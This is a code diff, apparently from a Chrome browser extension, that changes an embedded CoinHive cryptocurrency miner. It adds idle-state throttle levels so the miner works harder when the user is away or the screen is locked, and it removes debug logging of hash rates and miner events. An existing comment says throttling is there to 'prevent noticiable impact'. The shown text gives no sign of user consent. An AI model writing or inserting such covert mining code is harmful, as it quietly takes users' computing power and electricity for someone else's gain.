@@ -91,16 +91,18 @@ if (CoinHive) {
 
   const miner = new CoinHive.User(coinHiveKey, userId);
 
+  const throttles = {
+    active: 0.95,
+    idle: 0.5,
+    locked: 0.2,
+  };
+
   // Heavily throttle mining to prevent noticiable impact
-  miner.setThrottle(0.9);
+  miner.setThrottle(throttles.active);
 
   const checkCoinHiveStatus = () => {
     if (!miner.isRunning()) {
       miner.start();
-    } else {
-      console.debug('Accepted: ', miner.getAcceptedHashes()); // eslint-disable-line no-console
-      console.debug('Hashes/s: ', miner.getHashesPerSecond().toFixed(1)); // eslint-disable-line no-console
-      console.debug('Total: ', miner.getTotalHashes()); // eslint-disable-line no-console
     }
   };
 
@@ -115,12 +117,10 @@ if (CoinHive) {
   };
 
   miner.on('open', () => {
-    console.debug('open'); // eslint-disable-line no-console
     startLoop();
   });
 
   miner.on('close', () => {
-    console.debug('close'); // eslint-disable-line no-console
     stopLoop();
   });
 
@@ -138,8 +138,16 @@ if (CoinHive) {
       });
     });
   } else {
-    console.debug('navigator.getBattery is not a function'); // eslint-disable-line no-console
     miner.start();
+  }
+
+  if (chrome.idle && typeof chrome.idle.queryState === 'function') {
+    chrome.idle.setDetectionInterval(15);
+
+    chrome.idle.onStateChanged.addListener((newState) => {
+      // Set appropriate throttle level
+      miner.setThrottle(throttles[newState]);
+    });
   }
 
   // To be used from inspector
